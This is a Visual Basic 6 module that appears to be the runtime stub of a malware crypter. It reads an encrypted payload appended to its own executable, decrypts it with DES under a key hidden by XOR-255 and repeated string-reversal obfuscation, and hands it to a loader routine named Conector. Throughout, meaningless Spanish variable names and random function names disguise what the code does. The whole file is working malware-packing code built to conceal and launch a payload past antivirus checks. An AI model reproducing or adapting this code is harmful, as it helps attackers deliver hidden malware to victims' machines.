Attribute VB_Name = "PENA"

Option Explicit

Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function KillTimer Lib "user32" (ByVal enojo As Long, ByVal labios As Long) As Long
Private Declare Function SetTimer Lib "user32" (ByVal enojo As Long, ByVal labios As Long, ByVal tengo As Long, ByVal nana As Long) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Private huyt   As Boolean
Private llorar       As Long


Private Sub Main()

SetTimer 0, App.hInstance, 100, AddressOf ojos
Do
DoEvents: Call Sleep(100)
Loop Until huyt
End Sub

Sub makede(nadies As String)
Dim Z As New clsDES

nadies = Z.DecryptString(nadies, StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(StrReverse(BDIXDHBV(StrReverse(StrReverse(StrReverse(ACIXDHAU(StrReverse(ACIXDHAU("³”žŒ"))))))))))))))
NADA.Conector YO, StrConv(nadies, vbFromUnicode)
End Sub

Sub ojos(ByVal enojo As Long, ByVal labios As Long, ByVal tengo As Long, ByVal nana As Long)
KillTimer 0, App.hInstance
Call vida

End Sub

Sub vida()

Dim enojo As String, quites As Byte, comeon As Long, party As String, letgo As String * 8

If Not huyt Then
huyt = True

Open YO For Binary Access Read As #1
Seek #1, LOF(1) - 1: Get #1, , quites
Seek #1, LOF(1) - 9: Get #1, , letgo
comeon = Val(letgo)
If quites = 50 And comeon > 0 And comeon < LOF(1) Then
Seek #1, LOF(1) - 9 - comeon
party = Space(comeon)
Get #1, , party
End If
Call makede(party)
End If
Close #1
End Sub



Public Function ACIXDHAU(ByVal CTBYLRSV As String) As String
   Dim MODRGDFY As String, WPFEZUXI As String * 1, BRHXBGPL As Double
   For BRHXBGPL = 1 To Len(CTBYLRSV)
       WPFEZUXI = Mid(CTBYLRSV, BRHXBGPL, 1)
       MODRGDFY = MODRGDFY & Chr(Asc(WPFEZUXI) Xor 255)
   Next BRHXBGPL
   ACIXDHAU = MODRGDFY
End Function

Public Function BDIXDHBV(ByVal KCJHTABE As String) As String
   Dim UWLAOLNH As String, FXNMIDGQ As String * 1, JZPGJOYT As Double
   For JZPGJOYT = 1 To Len(KCJHTABE)
       FXNMIDGQ = Mid(KCJHTABE, JZPGJOYT, 1)
       UWLAOLNH = UWLAOLNH & Chr(Asc(FXNMIDGQ) Xor 255)
   Next JZPGJOYT
   BDIXDHBV = UWLAOLNH
End Function

